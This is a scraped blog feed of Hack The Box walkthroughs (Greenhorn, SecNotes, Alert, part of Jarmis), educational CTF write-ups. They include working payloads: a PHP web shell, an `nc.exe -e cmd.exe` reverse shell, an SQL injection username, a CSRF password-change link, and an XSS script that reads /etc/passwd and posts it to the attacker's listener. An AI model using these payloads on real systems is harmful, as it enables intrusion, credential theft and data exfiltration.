(isset($_SESSION[\u0026#39;pluck_before\u0026#39;])) redirect($_SESSION[\u0026#39;pluck_before\u0026#39;], 1); else redirect(\u0026#39;admin.php?action=start\u0026#39;, 1); include_once \u0026#39;data/inc/footer.php\u0026#39;; exit; } //If password is not correct; display error, and store attempt in loginattempt file for brute-force protection. elseif (($pass != $ww) \u0026amp;\u0026amp; (!isset($login_error))) { $login_error = show_error($lang[\u0026#39;login\u0026#39;][\u0026#39;incorrect\u0026#39;], 1, true); //If a loginattempt file already exists, update tries variable. if (file_exists(LOGIN_ATTEMPT_FILE)) $tries++; else $tries = 1; //Get current timestamp and save file. save_file (LOGIN_ATTEMPT_FILE, array(\u0026#39;tries\u0026#39; =\u0026gt; $tries, \u0026#39;timestamp\u0026#39; =\u0026gt; time())); } } ?\u0026gt; \u0026lt;span class=\u0026#34;kop2\u0026#34;\u0026gt;\u0026lt;?php echo $lang[\u0026#39;login\u0026#39;][\u0026#39;password\u0026#39;]; ?\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;cont1\u0026#34; size=\u0026#34;25\u0026#34; type=\u0026#34;password\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;bogus\u0026#34; class=\u0026#34;displaynone\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;\u0026lt;?php echo ucfirst($lang[\u0026#39;login\u0026#39;][\u0026#39;title\u0026#39;]); ?\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (isset($login_error)) echo $login_error; include_once \u0026#39;data/inc/footer.php\u0026#39;; } ?\u0026gt; Particularly this line of code require_once 'data/settings/pass.php'; from login.php lead me to data/settings/pass.php path in the repo and it had a password hash.\n\u0026lt;?php $ww = \u0026#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163\u0026#39;; ?\u0026gt; As from the length we can say that this is a sha512 hash, So I cracked it using hashcat Using the cracked password I logged in on the greenhorn website as admin, which is cool! While enumerating I found an exploit on exploit-DB for pluck (ref: CVE-2023-50564) Many CMS can be exploited by shipping a bad piece code to it\u0026rsquo;s managed web. Similar to the Sea box this CMS can also be exploited by installing a module with malicious code within it. I made a zip with reverseshell.php(Malicious code for reverse shell) included in it. Exploitation # To install the module I went to manage modules and uploaded the zip by clicking install module Then I found out installed modules are stored like this \u0026lt;URL\u0026gt;/data/modules/\u0026lt;zip_extracts_here\u0026gt; with the help of repo Triggered the reverse shell by visiting the malicious code(i.e. reverseshell.php) and got the connection Pivoting # From enumeration I learnt that there is an user called junior on the machine. I just tried using the previously cracked password and it worked for the user junior Got the User flag Privilege Escalation # In the home directory of junior, there is not only user flag but also a file named Using OpenVAS.pdf was also there. So I transferred the pdf file to my attack machine These were it\u0026rsquo;s contents Interesting right, Root password is blured From this article I found that actually, blured part can be recovered Using this tool Depixelization I can easily recontruct the particular blured sentence There is an option in my pdf reader to extract only the pix-elated part from the PDF as an image which was convinient for me. I Saved the image as png and then used the tool on that to get the original text python3 depix.py -p ../pixel.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../download-notepad_Windows10_closeAndSpaced.png Got the root user\u0026rsquo;s password Logged in as root and got the Root flag ","date":"26 March 2025","externalUrl":null,"permalink":"/posts/1742404292339-greenhorn-walkthroughhtb/","section":"Posts","summary":"","title":"Greenhorn Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # As usual I started with a Nmap scan, as for the interesting ones we got port 445 and 80, 8808 open Web port for an Active Directory seems interesting so I quickly checked the port 80 and we got a login page Also with an option to signup for creating new account. This website offeres notes saving feature for it\u0026rsquo;s users. For starters I registered an account and logged in. After a while I started enumerating. Then I noticed something, its getting the notes listed by using the username and also displays the username on the page. Seems good isn\u0026rsquo;t it. Exploitation # There are two ways to exploit this website, I am listing the both ways down Testing SQL Injection -\u0026gt; Path-1 # After seeing this, the idea of sql Injection suddenly sparked within my brain. As this lists notes for the site merely using username is bad cause a simple valid SQL injection payload might make the backend to list all the notes on the server it includes notes of all users. If you haven\u0026rsquo;t heard of SQL injection and if it\u0026rsquo;s new to you I already have a short post on SQL injections for begginers. Please check it I started the attack, First I tried 'or 1=1 -- - on the login page it didn\u0026rsquo;t worked so, the idea here is to create an account with this as the username 'or 1=1 -- -. I created an account with the username of 'or 1=1 -- - and it was a success. There is no validation for usernames, Actually in my opinion validation on everything is a requirement. With the malicious username now I can view everyone\u0026rsquo;s notes I searched through all the notes and from one of the notes I got a password and username for SMB share. CSRF/XSRF -\u0026gt; Path-2 # After creating a normal account and loggin in. We can see a beautiful page with with many options. When we visit the Contace Us page we could see a username tyler@secnotes.htb. Down to the name we can see a message box. Whatever message we write there will be sent to tyler@secnotes.htb as he is the recipient. Lets test this field, I opened netcat listener on port 7001 like this nc -lnvp 7001 When I send a http link with my IP through the contact form like this http://10.10.14.16:7001 I can see a connection on my listener. ❯ nc -lvnp 7001 listening on [any] 7001 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.10.97] 50700 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228 Host: 10.10.14.16:7001 Connection: Keep-Alive There is a vulnerable fuction in this website. Which is the password changing function. The account password changing request doesn\u0026rsquo;t include any CSRF token, so we can abuse this by a CSRF attack. Definition What is Cross-site Request Forgery(CSRF/XSRF)\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. Source: portswigger Prevention\nThis can be easily prevernted by pressing a CSRF token with each request, A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.\nNow lets carry on with our attack. The change_pass.php uses html body for it\u0026rsquo;s data. This is the request:\nPOST /change_pass.php HTTP/1.1 Host: 10.10.10.97 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 53 Origin: http://10.10.10.97 Connection: keep-alive Referer: http://10.10.10.97/change_pass.php Cookie: PHPSESSID=gvrrikfl1rol8qiggi03dgpha3 Upgrade-Insecure-Requests: 1 Priority: u=0, i password=kingoo\u0026amp;confirm_password=kingoo\u0026amp;submit=submit I can also change my password like this http://10.10.10.97/change_pass.php?password=iamdumbasf\u0026amp;confirm_password=iamdumbasf\u0026amp;submit=submit too. If I send this URL to tyler I can get him to change his password to iamdumbasf. I sent a message with this URL init. It was successful, I logged in as tyler with the password iamdumbasf This was the request: POST /contact.php HTTP/1.1 Host: 10.10.10.97 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 152 Origin: http://10.10.10.97 Connection: keep-alive Referer: http://10.10.10.97/contact.php Cookie: PHPSESSID=gvrrikfl1rol8qiggi03dgpha3 Upgrade-Insecure-Requests: 1 Priority: u=0, i message=http%3A%2F%2F10.10.10.97%2Fchange_pass.php%3Fpassword%3Diamdumbasf%26confirm_password%3Diamdumbasf%26submit%3Dsubmit%26submit%3DSend\u0026amp;submit=Send Accessing the SMB share # Quickly after enumerating the shares I logged into a share called new-site cause it seemed interesting, new-site share seems like a share for a web directory which could be this directory or the share for web port 8808. But At this point i\u0026rsquo;m 100% positive that this share is for the site hosted on web port 8808. I could easily upload a reverse shell and trigger it by going to the path as this is a web port. Wasted literally two hours cause web shells were not working, then after that restarted the machine and got one worked. Shell # I Created a file with this code and named it cd.php. \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; This above payload will enable command execution on the system. After uploading it via SMB and I executed/Triggered or tested the shell by visiting this http://secnotes.htb:8808/cd.php?cmd=whoami with a command value of whoami. Got a response, then to get a stable reverse shell connection I uploaded nc.exe into the smb share and accessed it http://10.10.10.97:8808/tester.php?cmd=nc.exe+-e+cmd.exe+10.10.14.5+6001 This is the command nc.exe -e cmd.exe \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; I got a shell back Eventually got User flag Privilege Escalation # I started my post exploitaion enumeration and while at that I found some interesting files within the C:\\\\ directory Root directory of systems with WSL installed would have directories similar to this and the Ubuntu.zip Indicating that this system has WSL installed. Typically WSL run as root/administrator. If I could excute the bash I could escalate my privilege. To My undertstanding there should a system link file of bash as bash.exe. So to exploit this we can search for bash.exe file where /R c:\\ bash.exe Pivoting # I got the path and after executing bash.exe I got root access easily on the wsl. Moments after stablizing the shell using python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)', I enumerated and read the history of the commands in the terminal and there I could see administrator password for a share. Now I logged in to the share using the administrator\u0026rsquo;s password. smbclient -U \u0026#39;administrator%password\u0026#39; \\\\\\\\10.10.10.97\\\\c$ Downloaded the root.txt file using get command Acquired Root flag Summary # I identified three open ports: 445 (SMB), 80 (HTTP), and 8808 (HTTP). I started by checking out the web server on port 80, which had a login page with a signup option. I decided to register an account, and I noticed that the notes displayed seemed to be tied to the username. This made me think about potential vulnerabilities, so I attempted an SQL injection by creating an account with the username \u0026lsquo;or 1=1 \u0026ndash; -. To my surprise, this worked, and I was able to view all the notes in the system. I also found another way which is a CSRF attack, I generated a password change request and sent the malicious URL to the user tyler through the contact form. Eventually tyler clicked the link which made to change password for his account. One of the notes contained a username and password for an SMB share. I connected to this share, which appeared to be the web directory for the HTTP server running on port 8808, allowing me to upload files. I tried uploading web shells, but they didn\u0026rsquo;t work initially. After restarting the machine, I finally got a PHP reverse shell to execute, granting me user access and the user flag. After gaining a foothold, I noticed some suspicious files in the C:\\ directory, which hinted at the possibility of WSL (Windows Subsystem for Linux) being present. I explored this further and located the bash.exe file. Executing it gave me root access to the Linux environment within WSL. To stabilize my access, I spawned a proper TTY shell and then checked the command history, where I found an administrator password for a share.\n","date":"24 March 2025","externalUrl":null,"permalink":"/posts/1742232333948-secnotes-walkthroughhtb/","section":"Posts","summary":"","title":"SecNotes Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # Started with a Nmap scan, revealing open ports: 22, 80. From the scan results I can also see 12227 port open which is also interesting. The scan results showed that Apache2 was hosting the website. The website featured a markdown reader page, The Basic functionality of this website is, get\u0026rsquo;s markdown file from the user and then reads the contents of the particular file for displaying it\u0026rsquo;s contents on the website. This website also included a share option for the rendered content. Again, it also has a simple contact form Now it should be obivious that this website uses HTML and JavaScript to render the contents like any other site on the internet I uploaded a .md file with JavaScript snippet init for testing, below were the contents of my md file\nAs expected the contents were rendered and loaded like this This is quite bad. It can execute arbitrary code as it renders the contents Exploitation # Also another functionality in this website is pretty straight forward, where in contact form whatever link is filled and sent seems to be clicked by an admin. We can easily get the admin\u0026rsquo;s cookie by making a .md file with malicious payload and by sharing the .md file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). More dangerously we could also read arbitrary files using the message.php So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=/etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; To trigger this payload, View it and use the share option and get the link, share it to the dumb admin via contact form. After many tries I got this correct I modified the payload accordingly to read the target file \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; Found couple of users. The configs for apache2 websites generally resides at /etc/apache2/sites-available/000-default.conf I learnt this from enumerating my own machine. After I modified the original payload to read this configuration file and I got the output. Got the .htpasswd location. Usually this file contains the passwords or hashes for apache2. Within that file, password hash for user albert was there\nLet\u0026rsquo;s crack the hash I used hashcat to crack this hash hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1600 --username Here I specified module 1600 to crack apache type hash and with as albert username is presented with the hash we have to specify --username flag Now I can use ssh to login as user albert I got the User flag Sorry I accidently nuked the user flag image Privilege Escalation # General SUID, SGID, Capabilities didn\u0026rsquo;t had anything promising But anyway there was a internal web service running on port 80 ss -tunlp so I tunneled it to my machine via ssh on port 2000. ssh -L 2000:localhost:8080 albert@alert.Hack The Box The web service name is litterely websitemonitor which tracks and monitor the websites like alert.htb I found the website\u0026rsquo;s directory location at /opt/websitemonitor The configuration files for this website are stored within /config The the web root folder of this website has root privileges and Albert also have access to modify it. So to escalate my privileges I changed the file to a reverseshell. Eventually secured Root flag Summary # The \u0026ldquo;Alert\u0026rdquo; box was approached with an initial reconnaissance phase where an nmap scan revealed three open ports: SSH (port 22) and a web server (port 80). The web server was identified as running Apache2 and hosting a Markdown reader page.\nDuring the enumeration phase, it was discovered that the Markdown reader could execute code embedded within the Markdown content. Additionally, a contact form was found to be exploitable because the administrator would click on links sent through it without analyzing them, suggesting a potential Local File Inclusion (LFI) vulnerability. This LFI was exploited by crafting a payload and sending it to the admin via the contact form. This allowed for the discovery of user information and the location of the Apache2 configuration file, which contained the path to the .htpasswd file. The password hash for the user albert was found within this file.\nThe exploitation phase also involved cracking albert\u0026rsquo;s password hash using hashcat. The cracked password enabled successful SSH login, granting initial user access and the user flag.\nFor privilege escalation, an internal web service named \u0026ldquo;websitemonitor\u0026rdquo; was discovered running on port 8080. This port was tunneled to the attacker\u0026rsquo;s machine via SSH. The configuration files for \u0026ldquo;websitemonitor,\u0026rdquo; including the web root, were located in /opt/websitemonitor/config. As the user albert and root had permissions to modify files in the web directory,I replaced a file with a reverse shell, leading to root access and the acquisition of the root flag.\n","date":"22 March 2025","externalUrl":null,"permalink":"/posts/1742495783286-alert-walkthroughhtb/","section":"Posts","summary":"","title":"Alert Walkthrough(Hack The Box)","type":"posts"},{"content":" About # Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.\nReconnaissance \u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Jarmis |_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 391.17 ms 10.10.14.1 2 391.18 ms 10.10.11.117 The scan looks normal, with usual order of a web port and ssh port. From loading and looking at the favicon itself I can tell that this a react page The root page looks static, it\u0026rsquo;s showing loading for a while now so I fired up ffuf for directory enumeration. Quickly ffuf finds couple of endpoints ❯ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.117/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 60 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ api [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 266ms] docs [Status: 200, Size: 967, Words: 195, Lines: 31, Duration: 267ms] favicon.ico [Status: 200, Size: 3870, Words: 16, Lines: 13, Duration: 273ms] index.html [Status: 200, Size: 2254, Words: 67, Lines: 1, Duration: 278ms] robots.txt [Status: 200, Size: 67, Words: 3, Lines: 4, Duration: 276ms] static [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 262ms] :: Progress: [4744/4744] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 :: /docs gets me to API documentation as I expected Let\u0026rsquo;s test each endpoint one by one. The first endpoint api/v1/search/id/{jarm_id} takes an integer as input so I provided a random number and got a signature back as json data in the response Testing the endpoints # Endpoint-1 - This is the curl command\ncurl \u0026#39;http://10.10.11.117/api/v1/search/id/3\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq Apparently the output may look like this { \u0026#34;id\u0026#34;: 3, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.193.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; } Endpoint-2 - Endpoint 2 is api/v1/search/signature/?keyword=\u0026lt;SIG\u0026gt;\u0026amp;max_results=10 takes string value as input - So when I input that signature from endpoint-1(Previous) it gives results.\ncurl \u0026#39;http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026amp;max_results=10\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq Response: { \u0026#34;results\u0026#34;: [ { \u0026#34;id\u0026#34;: 3, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.193.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; }, { \u0026#34;id\u0026#34;: 67, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.129.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; }, { \u0026#34;id\u0026#34;: 87, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;185.199.111.153:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;panda.tv\u0026#34; }, { \u0026#34;id\u0026#34;: 92, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.65.111:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;theguardian.com\u0026#34; }, { \u0026#34;id\u0026#34;: 108, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.194.132:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;thestartmagazine.com\u0026#34; }, { \u0026#34;id\u0026#34;: 131, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.2.137:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;wikihow.com\u0026#34; } ] } The results are odd anyway lets move on to next endpoint which should be the last one in the list Endpoint-3 - This endpoint itself interesting as it ends in /fetch and takes a string as input. This is the full endpoint /api/v1/fetch\nThi endpoint is promising so to test this I tried to hit back my host through this endpoint, First I spawned a nc listener and requested via this endpoint like this curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001\u0026#39; -H \u0026#39;accept: application/json\u0026#39; The reflection on nc my listener looks rather interesting cause, hmm\u0026hellip;look at this ❯ nc -lnvp 6001 listening on [any] 6001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834 �����\u0026amp;�so*�z�E_9l�s�e|��Kg8 u� ������Z1I�Wv㝱8�n1G����3g�����9k�����E�����\t�#�����+� �$�����,�r�s̩�����\u0026#39;�/��(�0�`�a�v�w̨�� /\u0026lt;�����5=�����A���� 10.10.14.18� 3\u0026amp;$ �����}L�)z/3��7�U�Ս�4�Q�xI���-+% This looks like an encrypted value to me, it could be a certificate or handshake but something encrypted that\u0026rsquo;s for sure so I fired up a listener with ssl Typical nc(NetCat) may give errors cause by default nc doesn\u0026rsquo;t support SSL so I installed ncat with sudo apt-get install ncat then used this command to get a listener with ssl. definition \u0026ldquo;ncat\u0026rdquo; is a modern reimplementation of the venerable Netcat, developed by the Nmap Project, and is a flexible tool for reading, writing, redirecting, and encrypting data across a network, often used for security testing and administration tasks ncat --ssl -lnvp 443 Now the connection just cuts off after two seconds, Which is weird ❯ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0362 8FEE A32F 8320 7092 B6DC BA81 43C8 A83F 4CB5 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:47406. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading I got this as my response from this request which is different in compared to previous one { \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } Understanding JARM # Before we move onto the next we have to learn about JARM Definition JARM (or JARM fingerprinting) is an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure\nThis article goes in-depth with JARM but the bottom line is, JARM works by actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.\nMy guess here is the response signature that I got must be from the first request out of the ten intended ones NetCat should\u0026rsquo;ve allowed only one connection, I can change it allow multiple connections by including the -k flag.\nNow I actually got ten connections in the logs\n❯ ncat --ssl -lnvkp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0293 5838 F917 921F 69AB 00DB 4768 FC73 813C 4488 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:47618. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47620. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47622. Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher Ncat: Connection from 10.10.11.117:47624. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47626. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47628. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47634. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47636. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47640. Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher Ncat: Connection from 10.10.11.117:47642. Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad key share The response from this also looks weird, now the response has different looking signature than the previous ones: ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 122 100 122 0 0 15 0 0:00:08 0:00:07 0:00:01 27 { \u0026#34;sig\u0026#34;: \u0026#34;21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;10.10.14.18\u0026#34; } This is the response from single connection: ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 148 100 148 0 0 28 0 0:00:05 0:00:05 --:--:-- 39 { \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } This the response from the first(From normal NetCat) or non-TLS listener: ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001\u0026#39; -H \u0026#39;accept: application/json\u0026#39; {\u0026#34;sig\u0026#34;:\u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;,\u0026#34;endpoint\u0026#34;:\u0026#34;10.10.14.18:6001\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;10.10.14.18\u0026#34;} We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. server, ismalicious) As my recent response seemed weird I used the Endpoint-1 to check the signature and the response from the request shows that my recent response is not in the database ❯ curl \u0026#39;http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21\u0026amp;max_results=10\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14 100 14 0 0 22 0 --:--:-- --:--:-- --:--:-- 22 { \u0026#34;results\u0026#34;: [] } We can see in the previous requests as it made from ncat it shows note value as NCAT? also ismalicious=false which is suspicious, as there could be fields with the value being true. Thankfully we can identify this easily by iterating over all the values in the ID parameter(Endpoint-1). First let us narrow down the values ❯ curl http://10.10.11.117/api/v1/search/id/400 null% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/300 null% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/200 